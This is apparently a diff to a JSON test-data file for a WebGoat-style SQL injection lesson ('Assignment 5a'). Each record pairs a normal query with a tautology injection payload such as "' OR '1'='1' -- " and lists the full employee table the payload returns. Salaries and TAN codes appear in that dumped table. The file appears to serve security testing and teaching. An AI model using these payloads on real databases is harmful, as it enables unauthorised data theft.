@@ -1,34 +1,234 @@
 [
     {
         "exfiltration_or_corruption": "exfiltration",
-        "expected": "[{\"USERID\": \"37648\", \"FIRST_NAME\": \"37648\", \"LAST_NAME\": \"John\", \"DEPARTMENT\": \"Smith\"}]",
+        "expected": [
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            }
+        ],
         "legit_query": "Smith",
         "name_of_lesson": "Assignment 5a",
-        "obtained": "[{\"USERID\": \"32147\", \"FIRST_NAME\": \"32147\", \"LAST_NAME\": \"Paulina\", \"DEPARTMENT\": \"Travers\"}]",
+        "obtained": [
+            {
+                "AUTH_TAN": "P45JSI",
+                "DEPARTMENT": "Accounting",
+                "FIRST_NAME": "Paulina",
+                "LAST_NAME": "Travers",
+                "SALARY": "46000.00",
+                "USERID": "32147"
+            },
+            {
+                "AUTH_TAN": "UU2ALK",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Abraham",
+                "LAST_NAME": "Holman",
+                "SALARY": "50000.00",
+                "USERID": "34477"
+            },
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            },
+            {
+                "AUTH_TAN": "TA9LL1",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Tobi",
+                "LAST_NAME": "Barnett",
+                "SALARY": "77000.00",
+                "USERID": "89762"
+            },
+            {
+                "AUTH_TAN": "LO9S2V",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "Bob",
+                "LAST_NAME": "Franco",
+                "SALARY": "83700.00",
+                "USERID": "96134"
+            }
+        ],
         "tainted_query": "Smith1' OR '1'='1' -- "
     },
     {
         "exfiltration_or_corruption": "exfiltration",
-        "expected": "[{\"USERID\": \"37648\", \"FIRST_NAME\": \"37648\", \"LAST_NAME\": \"John\", \"DEPARTMENT\": \"Smith\"}]",
+        "expected": [
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            }
+        ],
         "legit_query": "3SL99A",
         "name_of_lesson": "Assignment 5a",
-        "obtained": "[{\"USERID\": \"32147\", \"FIRST_NAME\": \"32147\", \"LAST_NAME\": \"Paulina\", \"DEPARTMENT\": \"Travers\"}]",
+        "obtained": [
+            {
+                "AUTH_TAN": "P45JSI",
+                "DEPARTMENT": "Accounting",
+                "FIRST_NAME": "Paulina",
+                "LAST_NAME": "Travers",
+                "SALARY": "46000.00",
+                "USERID": "32147"
+            },
+            {
+                "AUTH_TAN": "UU2ALK",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Abraham",
+                "LAST_NAME": "Holman",
+                "SALARY": "50000.00",
+                "USERID": "34477"
+            },
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            },
+            {
+                "AUTH_TAN": "TA9LL1",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Tobi",
+                "LAST_NAME": "Barnett",
+                "SALARY": "77000.00",
+                "USERID": "89762"
+            },
+            {
+                "AUTH_TAN": "LO9S2V",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "Bob",
+                "LAST_NAME": "Franco",
+                "SALARY": "83700.00",
+                "USERID": "96134"
+            }
+        ],
         "tainted_query": "3SL99A1' OR '1'='1"
     },
     {
         "exfiltration_or_corruption": "exfiltration",
-        "expected": "[{\"USERID\": \"37648\", \"FIRST_NAME\": \"37648\", \"LAST_NAME\": \"John\", \"DEPARTMENT\": \"Smith\"}]",
+        "expected": [
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            }
+        ],
         "legit_query": "3SL99A",
         "name_of_lesson": "Assignment 5a",
-        "obtained": "[{\"USERID\": \"32147\", \"FIRST_NAME\": \"32147\", \"LAST_NAME\": \"Paulina\", \"DEPARTMENT\": \"Travers\"}]",
+        "obtained": [
+            {
+                "AUTH_TAN": "P45JSI",
+                "DEPARTMENT": "Accounting",
+                "FIRST_NAME": "Paulina",
+                "LAST_NAME": "Travers",
+                "SALARY": "46000.00",
+                "USERID": "32147"
+            },
+            {
+                "AUTH_TAN": "UU2ALK",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Abraham",
+                "LAST_NAME": "Holman",
+                "SALARY": "50000.00",
+                "USERID": "34477"
+            },
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            },
+            {
+                "AUTH_TAN": "TA9LL1",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Tobi",
+                "LAST_NAME": "Barnett",
+                "SALARY": "77000.00",
+                "USERID": "89762"
+            },
+            {
+                "AUTH_TAN": "LO9S2V",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "Bob",
+                "LAST_NAME": "Franco",
+                "SALARY": "83700.00",
+                "USERID": "96134"
+            }
+        ],
         "tainted_query": "3SL99A1' OR '1'='1' -- "
     },
     {
         "exfiltration_or_corruption": "exfiltration",
-        "expected": "[{\"USERID\": \"37648\", \"FIRST_NAME\": \"37648\", \"LAST_NAME\": \"John\", \"DEPARTMENT\": \"Smith\"}]",
+        "expected": [
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            }
+        ],
         "legit_query": "3SL99A",
         "name_of_lesson": "Assignment 5a",
-        "obtained": "[{\"USERID\": \"32147\", \"FIRST_NAME\": \"32147\", \"LAST_NAME\": \"Paulina\", \"DEPARTMENT\": \"Travers\"}]",
+        "obtained": [
+            {
+                "AUTH_TAN": "P45JSI",
+                "DEPARTMENT": "Accounting",
+                "FIRST_NAME": "Paulina",
+                "LAST_NAME": "Travers",
+                "SALARY": "46000.00",
+                "USERID": "32147"
+            },
+            {
+                "AUTH_TAN": "UU2ALK",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Abraham",
+                "LAST_NAME": "Holman",
+                "SALARY": "50000.00",
+                "USERID": "34477"
+            },
+            {
+                "AUTH_TAN": "3SL99A",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "John",
+                "LAST_NAME": "Smith",
+                "SALARY": "64350.00",
+                "USERID": "37648"
+            },
+            {
+                "AUTH_TAN": "TA9LL1",
+                "DEPARTMENT": "Development",
+                "FIRST_NAME": "Tobi",
+                "LAST_NAME": "Barnett",
+                "SALARY": "77000.00",
+                "USERID": "89762"
+            },
+            {
+                "AUTH_TAN": "LO9S2V",
+                "DEPARTMENT": "Marketing",
+                "FIRST_NAME": "Bob",
+                "LAST_NAME": "Franco",
+                "SALARY": "83700.00",
+                "USERID": "96134"
+            }
+        ],
         "tainted_query": "3SL99A' OR ''='"
     },
     {
